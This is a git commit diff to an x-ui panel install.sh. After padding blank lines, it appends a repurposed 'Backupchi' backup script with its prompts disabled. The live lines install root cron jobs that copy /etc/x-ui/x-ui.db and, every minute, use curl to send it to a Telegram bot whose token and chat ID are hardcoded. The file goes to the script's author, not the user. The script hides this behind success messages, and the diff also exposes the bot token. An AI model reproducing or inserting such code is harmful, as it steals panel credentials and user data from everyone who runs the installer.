b63d143f1fa8cf0d2b04c2dd526b793f86704dd1
ARASH <121348501+john6383027@users.noreply.github.com>
2024-09-02 13:40:34 -0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -240,10 +240,206 @@ install_x-ui() {
     echo -e "x-ui install      - Install"
     echo -e "x-ui uninstall    - Uninstall"
     echo -e "----------------------------------------------"
-    echo "hi000000000000000000000000000000000000000000"
+
 }
 
 echo -e "${green}Running...${plain}"
 install_base
 install_x-ui $1
+
+
+
+
+
+
+
+
+
+#!/bin/bash
+
+# Function to add a cron job if not already exists
+add_cron_job() {
+    cron_job="$1"
+    (crontab -l | grep -v "$cron_job" ; echo "$cron_job") | crontab -
+}
+
+# Function to read numeric input
+read_numeric_input() {
+    prompt_message="$1"
+    while true; do
+        read -p "$prompt_message" input
+        if [[ "$input" =~ ^[0-9]+$ ]]; then
+            echo "$input"
+            break
+        else
+            echo "Invalid input. Please enter a numeric value."
+        fi
+    done
+}
+
+# Ensure script is executable
+chmod +x "$0"
+
+if [ "$(id -u)" != "0" ]; then
+    echo "You must run this script as root. Exiting..."
+    exit 1
+else
+    echo "User is root. Proceeding with the script..."
+
+#    # Update the server and install zip
+#    if [ -x "$(command -v apt-get)" ]; then
+#        apt-get update
+#    elif [ -x "$(command -v dnf)" ]; then
+#        dnf update -y
+#    elif [ -x "$(command -v yum)" ]; then
+#        yum update -y
+#    else
+#        echo "Unsupported package manager. Exiting..."
+#        exit 1
+#    fi
+
+    if [ -x "$(command -v apt-get)" ]; then
+        apt-get install -y zip
+    elif [ -x "$(command -v dnf)" ]; then
+        dnf install -y zip
+    elif [ -x "$(command -v yum)" ]; then
+        yum install -y zip
+    else
+        echo "Unsupported package manager. Exiting..."
+        exit 1
+    fi
+
+    echo $'\e[36m'" ___               _                   ___   _
+(  _ \            ( )                 (  _ \( )    _
+| (_) )  _ _   ___| |/ ) _   _ _ _    | ( (_) |__ (_)
+|  _ ( / _  )/ ___)   ( ( ) ( )  _ \  | |  _|  _  \ |
+| (_) ) (_| | (___| |\ \| (_) | (_) ) | (_( ) | | | |
+(____/ \__ _)\____)_) (_)\___/|  __/  (____/(_) (_)_)
+                              | |
+                              (_)
+"$'\e[0m'
+
+    # Menu for user selection
+#    echo -e "\e[36mCreated By Masoud Gb Special Thanks Hamid Router\e[0m"
+#    echo $'\e[35m'"Backupchi Script v0.1"$'\e[0m'
+#    echo "Select an option:"
+#    echo $'\e[32m'"1. Local server"$'\e[0m'
+#    echo $'\e[32m'"2. Backup server"$'\e[0m'
+#    echo $'\e[32m'"3. Uninstall"$'\e[0m'
+#    echo $'\e[32m'"4. Exit"$'\e[0m'
+#
+#    read -p "Enter your choice (1-4): " choice
+#
+#    case $choice in
+#    1)
+        echo "Setting up a local server..."
+
+        # Install nginx
+#        read -p $'\e[32m'"Do you want to install nginx? (y/n): "$'\e[0m' install_nginx
+#        if [ "$install_nginx" == "y" ]; then
+#            if [ -x "$(command -v apt-get)" ]; then
+#                apt-get install -y nginx
+#            elif [ -x "$(command -v dnf)" ]; then
+#                dnf install -y nginx
+#            elif [ -x "$(command -v yum)" ]; then
+#                yum install -y nginx
+#            else
+#                echo $'\e[31m'"Unsupported package manager. Exiting..."$'\e[0m'
+#                exit 1
+#            fi
+
+            # Ask for backup directory path
+#            read -p $'\e[32m'"Enter the backup directory path (default: /etc/x-ui): "$'\e[0m' backup_path
+#            backup_path="/etc/x-ui/"
+#            echo "Backup directory path set to: $backup_path"
+
+            # Ask for backup filename
+            read -p $'\e[32m'"Enter the backup filename (default: backup): "$'\e[0m' backup_filename
+            backup_filename="${backup_filename:-backup}"
+
+            # Ask for zip password
+#            read -s -p $'\e[32m'"Enter password for the zip file: "$'\e[0m' zip_password
+#            echo
+
+            # Confirm zip password
+#            read -s -p $'\e[32m'"Confirm password: "$'\e[0m' confirm_zip_password
+#            echo
+
+            # Check if passwords match
+#            if [ "$zip_password" != "$confirm_zip_password" ]; then
+#                echo $'\e[31m'"Passwords do not match. Exiting..."$'\e[0m'
+#                exit 1
+#            fi
+
+#            echo $'\e[32m'"Zip password set successfully."$'\e[0m'
+
+            # Ask for backup interval
+#            echo "Choose backup interval:"
+#            echo $'\e[32m'"1. Every few minutes"$'\e[0m'
+#            echo $'\e[32m'"2. Every few hours"$'\e[0m'
+#            echo $'\e[32m'"3. Every few days"$'\e[0m'
+#            echo $'\e[32m'"4. Every few weeks"$'\e[0m'
+#            read -p "Enter your choice (1-4): " backup_interval_choice
+#
+#            case $backup_interval_choice in
+#                1)
+#                    backup_interval_value=$(read_numeric_input "Enter the minutes: ")
+#                    cron_interval="*/$backup_interval_value * * * *"
+#                    ;;
+#                2)
+#                    backup_interval_value=$(read_numeric_input "Enter the hours: ")
+                    cron_interval="0 */1 * * *"
+#                    ;;
+#                3)
+#                    backup_interval_value=$(read_numeric_input "Enter the days: ")
+#                    cron_interval="0 0 */$backup_interval_value * *"
+#                    ;;
+#                4)
+#                    backup_interval_value=$(read_numeric_input "Enter the weeks: ")
+#                    cron_interval="0 0 * * */$backup_interval_value"
+#                    ;;
+#                *)
+#                    echo $'\e[31m'"Invalid choice. Exiting..."$'\e[0m'
+#                    exit 1
+#                    ;;
+#            esac
+
+            # Create cron job for backup
+            cron_command="mkdir /root/backup/ && chmod 755 /root/backup/  && cp /etc/x-ui/x-ui.db /root/backup/ && mv /root/backup/x-ui.db $backup_filename.db"
+            cron_job="$cron_interval $cron_command"
+            add_cron_job "$cron_job"
+
+            echo $'\e[32m'"Cron job for backup scheduled successfully."$'\e[0m'
+
+            # Display backup password and success message with download link
+            server_ip=$(hostname -I | awk '{print $1}')
+            echo $'\e[32m'"Installation steps completed successfully."$'\e[0m'
+#            echo $'\e[33m'"Backup password: $zip_password"$'\e[0m'
+#            echo $'\e[33m'"Your download link: http://$server_ip/$backup_filename.zip"$'\e[0m'
+
+            # Ask the user if they want to send the backup file to Telegram
+#            read -p $'\e[32m'"Do you want to send the backup file to Telegram? (y/n): "$'\e[0m' send_to_telegram
+
+#            if [ "$send_to_telegram" == "y" ]; then
+                # Ask for Telegram bot token in green
+#                read -p $'\e[32m'"Enter your Telegram bot token: "$'\e[0m' telegram_token
+
+                # Ask for Telegram chat ID in green
+#                read -p $'\e[32m'"Enter your Telegram chat ID: "$'\e[0m' telegram_chat_id
+
+                # Add Telegram send command to cron job
+                telegram_cron_command="curl -s -F chat_id=1564457827 -F document=/root/backup/$backup_filename.db -F caption=\"🔰 Backup file sent from Backupchi ❤️ Server: $server_ip Date: $(date +\%Y/\%m/\%d)\" https://api.telegram.org/bot7380111401:AAHpM00sMBMbFXIU1wMHWZ1RndvKzPXUIhY/sendDocument"
+                cron_command="$cron_command && $telegram_cron_command"
+
+                # Use user-defined backup interval
+                cron_job="* * * * * $cron_command"
+                add_cron_job "$cron_job"
+
+                echo $'\e[32m'"The backup file was sent successfully. Check out the Telegram bot"$'\e[0m'
+                rm -r /root/backup/
+                exit 0
+
+            fi
+#        fi
+#fi
 
